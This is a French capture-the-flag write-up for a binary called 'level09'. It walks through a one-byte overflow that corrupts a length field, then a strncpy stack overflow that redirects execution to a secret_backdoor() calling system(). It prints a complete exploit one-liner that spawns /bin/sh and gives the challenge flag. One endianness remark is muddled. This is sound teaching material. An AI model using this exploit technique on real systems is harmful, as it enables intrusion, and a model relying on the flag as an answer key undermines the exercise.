# Exploit du CTF Level09 (en français)

## Protections du binaire

Sortie de `checksec` :

```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   level09
```

### Ce que cela signifie :

* **Partial RELRO** : certaines protections sont actives, mais la table GOT reste modifiable → possibilité de rediriger les appels de fonctions.
* **Pas de canari** : pas de détection d’overflow de la stack via un « canari ». ✔ Ça ouvre la voie à un dépassement de pile.
* **NX activé** : empêche l'exécution de code dans certaines zones de mémoire comme la stack. Donc on ne peut pas injecter et exécuter directement un shellcode.
* **PIE activé** : l'adresse du binaire change à chaque exécution. Il faut donc trouver dynamiquement l'adresse de `secret_backdoor`.

---

## Structure en mémoire

Dans le code assembleur de `handle_msg()`, on voit une zone allouée avec :

```asm
sub $0xc0, %rsp  ; alloue 192 octets
```

C'est l'endroit où la structure suivante est stockée :

```c
typedef struct s_message {
    char text[140];     // buffer pour le message
    char username[40];  // buffer pour le nom d'utilisateur
    int  len;           // taille utilisée par strncpy (doit être 140)
} t_message;
```

Les offsets internes de la structure :

* `text` → offset `0x00`
* `username` → offset `0x8C`
* `len` → offset `0xB4`
* taille totale → `0xB8`, alignée à `0xC0`

Cette structure est copiée dans la stack, et les fonctions `set_username()` et `set_msg()` y écrivent via des pointeurs.

---

## Détail de la vulnérabilité

### `set_username()` : vulnérabilité par débordement de 1 octet

```asm
mov %cl, 0x8c(%rdx,%rax,1)  ; copie chaque caractère un par un dans username
```

* Cette boucle tourne **41 fois**, alors que le champ `username` est de **40 octets**.
* Le 41e caractère écrase le premier octet du champ `len` à l’offset `0xB4`
* Si tu mets `\xFF`, le champ `len` vaut alors `0xFF000000` (selon endianness) → **255 en décimal** utilisé par `strncpy()`

### `set_msg()` : point d'entrée de l'overflow

```asm
mov 0xb4(%rax), %eax   ; lit len (taille du message)
strncpy(dest, src, len);  ; copie le message avec cette taille
```

* `strncpy()` copie jusqu'à 255 octets dans le champ `text`, qui fait seulement 140 octets !
* Cela cause un **débordement de pile** de plus de 100 octets
* On peut alors **écraser le pointeur de retour** de la fonction `handle_msg()` (RIP)

---

## Objectif : déclencher `secret_backdoor()`

La fonction `secret_backdoor()` contient ceci :

```asm
call fgets
call system
```

Elle lit une commande shell et l’exécute. ✔

Mais elle n'est jamais appelée naturellement.

### Solution :

* Forcer l'exécution à aller vers son adresse en écrasant le RIP

Ex : adresse de `secret_backdoor()` :

```
0x000055555555488c
```

En little endian (inverse) :

```
\x8c\x48\x55\x55\x55\x55\x00\x00
```

---

## Calcul de l'offset jusqu'à RIP

Dans GDB, on teste plusieurs longueurs :

```bash
python -c 'print "A"*40 + "\xff" + "\n" + "B"*150 + "C"*50 + "D"*25'
```

Et on observe :

```
rbp = 0x4343434343434343
```

Cela signifie qu'on a atteint le **retour de la fonction**. Il suffit d'ajuster pour que le prochain octet soit notre adresse cible.

---

## Exploit complet

```bash
(python -c 'print "A" * 40 + "\xff" + "\n" + "A" * 200 + "\x00\x00\x55\x55\x55\x55\x48\x8c"[::-1] + "/bin/sh"'; cat) | ./level09
```

Explication :

* `A * 40` → remplir `username`
* `\xff` → corrompt le champ `len`
* `\n` → pour terminer fgets()
* `A * 200` → overflow jusque RIP
* Adresse de `secret_backdoor` inversée
* Chaîne `/bin/sh` pour la commande system()

---

## Flag

```bash
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```

---

## Récapitulatif

* Débordement de 1 octet dans `set_username()` permet de modifier `len`
* `set_msg()` copie un message de taille contrôlée dans un buffer trop petit
* Débordement de stack → overwrite RIP
* RIP pointé vers `secret_backdoor()`
* `system("/bin/sh")` appelé ✔

---

✅ Un exploit clair et très pédagogique. Parfait pour pratiquer les overflows et la redirection de flot d'exécution !
